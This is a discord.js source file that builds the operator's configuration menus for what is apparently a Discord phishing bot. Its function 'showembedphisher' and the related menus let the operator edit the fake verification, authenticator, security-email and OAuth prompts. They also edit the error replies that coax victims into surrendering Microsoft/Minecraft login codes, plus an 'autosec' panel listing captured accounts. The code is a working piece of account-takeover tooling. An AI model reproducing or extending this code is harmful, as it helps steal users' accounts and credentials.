const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { EmbedBuilder } = require('discord.js');

/*
ShowEditEmbeds explanation:
Important
The User-ID transferred is always the owner-ID, use user id which can sometimes differ on own bot from user, as interaction.user.id
*/


async function showembedphisher(client, interaction, botnumber, userid) {
    return interaction.reply({
        embeds: [{
            title: `Which embed do you want to change?`,
            description: `For Authenticator & Security:\n* Enter (sec) for it to be replaced by Auth Number or Email.`,
            color: 0xC8C8C8
        }],
        components: [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|main|${botnumber}|${userid}`).setLabel("Verification").setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`embeds|authenticator|${botnumber}|${userid}`).setLabel("Authenticator").setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`embeds|sec|${botnumber}|${userid}`).setLabel("Security Email(s)").setStyle(ButtonStyle.Primary)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|res|${botnumber}|${userid}`).setLabel("Final response").setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`embeds|oauth|${botnumber}|${userid}`).setLabel("oAuth Embed").setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`embeds|split|${botnumber}|${userid}`).setLabel("Split Verification").setStyle(ButtonStyle.Primary)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|extrabutton|${botnumber}|${userid}`).setLabel("Extra Button").setStyle(ButtonStyle.Primary)
            )
        ],
        ephemeral: true
    });
}

async function showembederror(client, interaction, botnumber, userid) {
    return interaction.reply({
        embeds: [{
            title: `Which embed do you want to change?`,
            color: 0xC8C8C8
        }],
        components: [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|invalid email|${botnumber}|${userid}`).setLabel("Invalid Email Format").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|account doesn't exist|${botnumber}|${userid}`).setLabel("Email doesn't exist").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|invalid|${botnumber}|${userid}`).setLabel("Invalid Code").setStyle(ButtonStyle.Danger)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|codenotnumbers|${botnumber}|${userid}`).setLabel("Code Non-Numbers").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|otp|${botnumber}|${userid}`).setLabel("OTP Disabled").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|howto|${botnumber}|${userid}`).setLabel("Add security email").setStyle(ButtonStyle.Danger)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|wrongnumber|${botnumber}|${userid}`).setLabel("Auth Wrong Number").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|timeout|${botnumber}|${userid}`).setLabel("Auth App Timeout").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|blacklisted|${botnumber}|${userid}`).setLabel("Blacklisted").setStyle(ButtonStyle.Danger)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|locked|${botnumber}|${userid}`).setLabel("Account is locked").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|nomc|${botnumber}|${userid}`).setLabel("Account doesn't own MC").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`embeds|howtoauth|${botnumber}|${userid}`).setLabel("How to [Authenticator]").setStyle(ButtonStyle.Danger)
            ),
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|invalidated|${botnumber}|${userid}`).setLabel("Username doesn't pass check").setStyle(ButtonStyle.Danger)
            )
        ],
        ephemeral: true
    });
}

async function showembedautosec(client, interaction, botnumber, userid) {
    return interaction.reply({
        embeds: [{
            title: `Which embed do you want to change?`,
            color: 0xC8C8C8
        }],
        components: [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|listaccount|${botnumber}|${userid}`).setLabel("List account").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`embeds|statsmsg|${botnumber}|${userid}`).setLabel("Stats overview").setStyle(ButtonStyle.Success)
            )
        ],
        ephemeral: true
    });
}

async function showeditdm(client, interaction, botnumber, userid) {
    return interaction.reply({
        embeds: [{
            title: `Which embed do you want to change?`,
            color: 0xC8C8C8
        }],
        components: [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`embeds|dm1|${botnumber}|${userid}`).setLabel("Embed on join").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`embeds|dm2|${botnumber}|${userid}`).setLabel("Embed on continue").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`embeds|dm3|${botnumber}|${userid}`).setLabel("Embed on finished").setStyle(ButtonStyle.Success)
            )
        ],
        ephemeral: true
    });
}

module.exports = {
    showembedphisher,
    showembederror,
    showembedautosec,
    showeditdm
}
